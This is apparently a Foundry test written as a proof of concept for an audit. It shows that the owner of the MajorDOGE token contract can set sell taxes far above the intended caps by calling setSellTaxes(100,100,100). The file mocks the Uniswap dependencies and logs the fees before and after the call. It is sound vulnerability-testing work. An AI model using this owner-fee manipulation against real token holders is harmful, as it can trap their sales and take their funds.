// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MajorDOGE.sol";

contract FeeManipulationTest is Test {
    MajorDOGE token;
    address owner = address(0x1);
    
    function setUp() public {
        // Setup environment and deploy contract
        vm.startPrank(owner);

        // Mock external Uniswap dependencies
        address routerAddress = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address mockFactory = address(0xf00);
        address mockPair = address(0xface);
        
        // Mock router factory call
        vm.mockCall(
            routerAddress,
            abi.encodeWithSignature("factory()"),
            abi.encode(mockFactory)
        );
        
        // Mock router WETH call
        vm.mockCall(
            routerAddress,
            abi.encodeWithSignature("WETH()"),
            abi.encode(address(0xdead))
        );
        
        // Mock factory createPair call
        vm.mockCall(
            mockFactory,
            abi.encodeWithSignature("createPair(address,address)"),
            abi.encode(mockPair)
        );

        // Deploy contract after mocking dependencies
        token = new MajorDOGE();
        vm.stopPrank();
    }

    function testOwnerCanSetSellTaxesAboveLimit() public {
        // Differential verification: Pre-attack state snapshot
        console.log("--- BEFORE-Trigger Sell Taxes Query ---");
        (uint256 preLiquidityFee, uint256 preMarketingFee, uint256 preTeamFee) = 
            (token._sellLiquidityFee(), token._sellMarketingFee(), token._sellTeamFee());
        uint256 preTotalTax = token._totalTaxIfSelling();
        
        console.log("Pre-attack sell liquidity fee: %", preLiquidityFee);
        console.log("Pre-attack sell marketing fee: %", preMarketingFee);
        console.log("Pre-attack sell team fee: %", preTeamFee);
        console.log("Pre-attack total sell tax: %", preTotalTax);
        
        // Attack trigger: Set unreasonably high taxes
        console.log("--- Trigger: setSellTaxes(100, 100, 100) ---");
        vm.startPrank(owner);
        token.setSellTaxes(100, 100, 100);
        vm.stopPrank();
        
        // Differential verification: Post-attack state snapshot
        console.log("--- AFTER-Trigger Sell Taxes Query ---");
        (uint256 postLiquidityFee, uint256 postMarketingFee, uint256 postTeamFee) = 
            (token._sellLiquidityFee(), token._sellMarketingFee(), token._sellTeamFee());
        uint256 postTotalTax = token._totalTaxIfSelling();
        
        console.log("Post-attack sell liquidity fee: %", postLiquidityFee);
        console.log("Post-attack sell marketing fee: %", postMarketingFee);
        console.log("Post-attack sell team fee: %", postTeamFee);
        console.log("Post-attack total sell tax: %", postTotalTax);
        
        // Vulnerability judgment
        bool feesManipulated = (postLiquidityFee != preLiquidityFee) && 
                            (postMarketingFee != preMarketingFee) && 
                            (postTeamFee != preTeamFee);
        bool excessiveTax = (postLiquidityFee == 100) && 
                         (postMarketingFee == 100) && 
                         (postTeamFee == 100);
        
        console.log("Fee state changed: %s", feesManipulated ? "YES" : "NO");
        console.log("Excessive fees set (100% each): %s", excessiveTax ? "YES" : "NO");
        
        // Final verdict based on state comparison
        if (excessiveTax && feesManipulated) {
            console.log("Vulnerability Exists: Owner successfully bypassed tax caps");
        } else {
            console.log("Vulnerability not Exist: Attack did not alter fees or values within expected limits");
        }
    }
}